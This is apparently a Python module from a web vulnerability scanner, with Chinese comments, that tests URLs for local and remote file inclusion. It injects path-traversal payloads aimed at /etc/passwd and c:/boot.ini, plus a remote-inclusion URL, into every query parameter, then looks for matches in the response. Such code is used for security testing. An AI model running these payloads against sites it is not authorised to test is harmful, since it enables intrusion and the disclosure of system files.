import urllib.parse as urlparse
import core
import re

'''
先完成本地文件包含模块
    想法是--->提供8种不同的本地文件包含攻击模块：
        /proc/self/environ
        php://filter
        php://input
        /proc/self/fd
        access log
        phpinfo
        data://
        expect://
    暂时先完成简易版本的windows，linux 本地和远程文件包含
    不仅仅是要打进payload，还需要检测payload是否生效
    部分思路参考自浪子师傅的博客：http://www.langzi.fun/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html
'''

def CheckLocalFileInclude(url):
    paths = [
        ('../../../../../../../../../../etc/passwd', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
        ('../../../../../../../../../../etc/passwd%00', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
        ('http://cirt.net/rfiinc.txt?', '<title>phpinfo'),
        ('c:/boot.ini', '\[boot loader\][^\r\n<>]*[\r\n]'),
    ]
    domain = url.split("?")[0]
    queries = urlparse.urlparse(url).query.split("&")
    if not any(queries):
        return False, None,None
    else:
        for inj, fingerprint in paths:
            website = domain + "?" + ("&".join([params.split("=")[0]+"=" + inj for params in queries]))
            source = core.gethtml(website,timeout=5)
            if re.search(fingerprint, source):
                # print("(+)this url have fileinclude bug {},payload is {}".format(url,website))
                return True,website,source
    return False,None,None

if __name__=='__main__':
    CheckLocalFileInclude("http://127.0.0.1/Cl0ud.php?page=1")